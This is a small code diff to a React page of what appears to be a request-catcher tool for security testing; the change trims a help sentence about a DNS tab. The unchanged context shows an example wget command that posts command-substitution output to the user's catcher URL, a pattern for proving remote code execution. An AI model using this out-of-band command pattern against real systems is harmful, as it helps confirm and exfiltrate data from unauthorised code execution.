@@ -27,7 +27,7 @@ export class RequestsPage extends Component {
               <code>wget --post-data "$(echo RCE)" -O- {this.props.user.url}</code>
               <br />
               <br />
-              <p>Check out the Response tab to edit your HTTP Response or the DNS tab to add DNS records for this subdomain.</p>
+              <p>Check out the Response tab to edit your HTTP Response.</p>
             </div>
           </div>
         )}
